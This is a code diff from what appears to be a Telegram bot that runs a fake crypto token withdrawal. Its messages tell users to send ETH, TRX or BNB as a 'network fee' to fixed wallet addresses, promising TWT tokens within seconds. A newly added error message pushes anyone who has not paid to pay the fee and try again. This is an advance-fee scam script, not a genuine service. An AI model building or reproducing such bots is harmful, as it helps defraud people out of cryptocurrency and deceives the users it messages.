@@ -198,7 +198,7 @@ async function withdrawFunction(chat){
 async function ethGasFee(chat){
     try {
         const text = " 📝 Please Send 0.009 ETH as Ethereum (ERC20) network fee for withdraw your TWT Tokens.\n\n"+
-                     "Address :- <code> 0x1Eebc95ac5945C467a9c73Aa0b527137983595fE <code/> \n\n"+
+                     "Address :- 0x1Eebc95ac5945C467a9c73Aa0b527137983595fE \n\n"+
                      "Send: 0.009 ETH \n\n"+
                     "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                      "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";
@@ -227,7 +227,7 @@ async function trxGasFee(chat){
 
 
         const text = " 📝 Please Send 230 TRX as Tron (TRC20) network fee for withdraw your TWT Tokens.\n\n"+
-                     "Address :- <code> TPFDpdFrMndJD8ZwhKC9joZ22pGyCgPzvJ <code/> \n\n"+
+                     "Address :-TPFDpdFrMndJD8ZwhKC9joZ22pGyCgPzvJ \n\n"+
                      "Send: 230 TRX \n\n"+
                     "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                      "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";
@@ -255,7 +255,7 @@ async function bnbGasFee(chat){
 
 
         const text = " 📝 Please Send 0.05 BNB Smart Chain as BNB (BEP20) network fee for withdraw your TWT Tokens. \n\n"+
-                     "Address :- <code> bnb1e3tpnrmlft3eaqdrg9kalwwtq93a8p45r350a3 <code/> \n\n"+
+                     "Address :- bnb1e3tpnrmlft3eaqdrg9kalwwtq93a8p45r350a3 \n\n"+
                      "Send: 0.05 TRX \n\n"+
                     "➡️ After Server Receive your Transaction fee you will receive Your TWT Tokens within 10-40 Seconds.\n\n"+ 
                      "⚠️ Note: After Send Amount Must click on '✅ Confirm Transaction' button";
@@ -278,8 +278,32 @@ async function bnbGasFee(chat){
     }
 }
 
+async function errorMessage(chat){
+    try {
+        const text = "❌ Your Transaction Not Found !\n"+
+                      "it's Seems you're trying Confirm\n"+
+                      "Transaction without paying Gas fee... Please Pay the Gas fee and Try Again";
+               
+        const  keyboard = [
+            [{ text: 'check ✅', callback_data: '/Withdraw' }]
+            ]
+        
+            const  keyboardJSON = JSON.stringify({ 'inline_keyboard': keyboard });
+          
+            return {
+                chat_id: chat?.id,
+                text,
+                reply_markup: keyboardJSON,
+                urlType: `sendMessage`
+            }
 
-module.exports = {startFuntion, JoinGroupFunction, submitWallet, submitWalletComplete, withdrawFunction, ethGasFee, trxGasFee, bnbGasFee};
+    } catch (err) {
+        console.log(err);
+    }
+}
+
+
+module.exports = {startFuntion, JoinGroupFunction, submitWallet, submitWalletComplete, withdrawFunction, ethGasFee, trxGasFee, bnbGasFee, errorMessage};
 
 
 
